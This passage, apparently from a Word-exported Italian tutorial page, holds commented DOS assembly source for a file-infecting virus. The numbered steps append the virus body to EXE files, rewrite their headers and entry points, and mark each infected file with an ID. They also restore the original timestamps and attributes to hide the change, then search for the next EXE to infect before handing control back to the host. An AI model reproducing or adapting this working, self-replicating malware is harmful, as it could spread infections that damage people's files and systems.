bx,word ptr [bp+header+8h]<span style="mso-spacerun: yes">      </span>;prendo
la misura dell’header in para<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; un
paragrafo è di 16 bytes e noi abbiamo bisogno della misura in bytes. Per <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; questo
motivo la moltiplichiamo per 16:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
cl,4<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>shl
bx,cl<span style="mso-spacerun: yes">                     </span>;shl ruota i
bits a sinistra di 4 posizioni<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;questo equivale a moltiplicare
per 16.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;ora, BX è
uguale alla lunghezza dell’header in bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;AX
contiene la misura del file (low word)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>sub
ax,bx<span style="mso-spacerun: yes">                     </span>;ora
sottraiamo la misura dell’header dalla<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;misura del file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>sbb
dx,0<span style="mso-spacerun: yes">                      </span>;se CF è
settato esso sotrarrà 1, altrimenti 0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;ora,
DX:AX conterrà la misura del file-la misura dell’header<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; dobbiamo
convertire DX:AX nella forma segmento:indirizzo perché ora è solo un <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;valore.
Per convertirlo a segmento:indirizzo dobbiamo dividerlo per 16.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov cx,10h<span style="mso-spacerun: yes">                   
</span>;cx=10h=16<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>div cx<span
style="mso-spacerun: yes">                        </span>;divido per 16<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>; AX=(DX:AX)<span style="mso-spacerun: yes">  </span>/<span
style="mso-spacerun: yes">  </span>16<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">                                   
</span>; DX=(DX:AX) mod 16<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>;ora, DX:AX contiene il CS:IP
entry point (stored backwards - IP:CS)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>;salvo il nuovo CS:IP
le buffer header. Salvo anche<span style="mso-spacerun: yes">  </span>SS e
insewrisco il nostro ID <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov word ptr [bp+header+14h],dx<span style="mso-spacerun: yes">    
</span>;metto indirizzo (ExeIP)=new entry point<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>mov word ptr
[bp+header+16h],ax<span style="mso-spacerun: yes">     </span>;metto indirizzo
di segmento di code seg<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
word ptr [bp+header+0eh],ax<span style="mso-spacerun: yes">     </span>;metto
indirizzo di segmento di stack seg<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov word ptr [bp+header+10h],'DV'<span style="mso-spacerun: yes">  
</span>;metto ID bytes at 10h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>; si potrebbe usare
12h (ChkSum) invece di 10h...<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>pop dx
ax bx<span style="mso-spacerun: yes">         </span><span style="mso-spacerun:
yes">         </span>;ripristina gli originali file size and file <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;handle<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
---------- Punto 17 – Calcolo I nuovi valori di PartPag and PageCnt ---------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; E’
semplice. Dobbiamo aggiungere la misura del codice virale alla misura del <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; file, e
convertirlo in pagine dividendolo per 512.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>; AX e DX
contengono la misura del file <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>add
ax,heap-begin<span style="mso-spacerun: yes">             </span>;aggiunge la
misura del virus size all’originale <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun:
yes">                                    </span>;misura del size<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>adc
dx,0<span style="mso-spacerun: yes">                      </span>;sw CF add 1,
altrimenti 0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
cx,512<span style="mso-spacerun: yes">                    </span>;converte il
risultato in pagine dividendo<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>div
cx<span style="mso-spacerun: yes">                        </span>;per 512<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>inc ax<span
style="mso-spacerun: yes">                        </span>;aggiunge uno per
arrotondamento superiore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
word ptr [bp+header+4],ax<span style="mso-spacerun: yes">       </span>;mette
nuovo PageCnt<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
word ptr [bp+header+2],dx<span style="mso-spacerun: yes">       </span>;mette
nuovo PartPag<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------- Punto 18 – scrivo il codice virus a EOF -----------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ah,40h<span style="mso-spacerun: yes">                   
</span>;funzione DOS=Write To File<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov cx,heap-begin<span
style="mso-spacerun: yes">             </span>;cs=size to write=size virus<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>lea dx,[bp+offset
begin]<span style="mso-spacerun: yes">      </span>;cominciando da
&quot;begin&quot;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>; ----------------- Punto 19 -
Seek a BOF (beginning of file) -----------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov ax,4200h<span
style="mso-spacerun: yes">                  </span>;funzione DOS=Set File
Pointer (Seek) to BOF<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>xor cx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>cwd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
---------------------- Punto 20 – Scrivo il nuovo header --------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ah,40h<span style="mso-spacerun: yes">                   
</span>;funzione DOS=Write To File<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov cx,1ch<span
style="mso-spacerun: yes">                    </span>;cx=size to write=misura
dell’EXE header<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>lea dx,[bp+offset
header]<span style="mso-spacerun: yes">     </span>;scrivo da
&quot;header&quot; buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
----------------- Punto 21 – Ripristina ora e data --------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov dx,word ptr [bp+file_date]<span style="mso-spacerun: yes">     
</span>;dx=originale data<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov cx,word ptr
[bp+file_time]<span style="mso-spacerun: yes">      </span>;cx=originale ora<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov ax,5701h<span
style="mso-spacerun: yes">            </span><span style="mso-spacerun:
yes">            </span>;funzione DOS=Set File Time/Date<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>un_altro:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------------- Punto 22 – Chiudo il file -------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ah,3eh<span style="mso-spacerun: yes">                    </span>;funzione
DOS=Close File<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>abort:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------- Punto 23 – Ripristino attributi originali ---------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ax,4301h<span style="mso-spacerun: yes">                  </span>;funzione
DOS=Set File Attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>lea
dx,[bp+offset dta+1eh]<span style="mso-spacerun: yes">    </span>;prende il
nome file da DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
cx,word ptr [bp+file_attr]<span style="mso-spacerun: yes">     
</span>;ripristina attributi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
-------------------- Punto 24 – cerca per un nuovo file EXE -----------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ah,4fh<span style="mso-spacerun: yes">                   
</span>;funzione DOS=Find Next Matching File<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>lea
dx,[bp+filespec]<span style="mso-spacerun: yes">          </span>;cerca solo
(*.EXE)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>jmp
facciamolo<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>exit:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------- Punto 25 – Ripristina parti dell’header dallo stack -----------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>;ripristina CS:IP e SS:SP dallo stack<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'>pop [bp+exe_sp]<span style="mso-spacerun: yes">               </span>;ripr.
SP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=FR
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'><span style="mso-spacerun: yes">      </span>pop [bp+exe_ss]<span
style="mso-spacerun: yes">               </span>;ripr. </span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>SS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>pop [bp+exe_ip]<span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes">           </span>;ripr. IP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
FR'>pop [bp+exe_cs]<span style="mso-spacerun: yes">               </span>;ripr.
</span></b><b><span style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>CS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------------- Punto 26 – Ripristina DTA -------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov ah,1ah<span style="mso-spacerun: yes">   </span>;funzione DOS=Set
Disk Transfer Address<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>mov dx,80h<span
style="mso-spacerun: yes">   </span>;cambio il DTA a quello originale (il DTA è
all’indirizzo 80h nel <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">                  
</span>;PSP)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>pop es
ds<span style="mso-spacerun: yes">                     </span>;ripristino ES e
DS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
------------------- Punto 27 – rimetto il controllo all’host ----------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ax,es<span style="mso-spacerun: yes">    </span>;ax punterà al PSP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>add
ax,10h<span style="mso-spacerun: yes">   </span>;salto il PSP (ax&lt;-PSP+10h)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>add word ptr cs:[bp+_cs],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>; _ip è uno degli
indirizzi del nostro jump per ritornare all’host<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;
vediPunto 2 per settare CS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>mov bx,word ptr cs:[bp+exe_ip]<span style="mso-spacerun: yes">     
</span>;make _ip = exe_ip<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
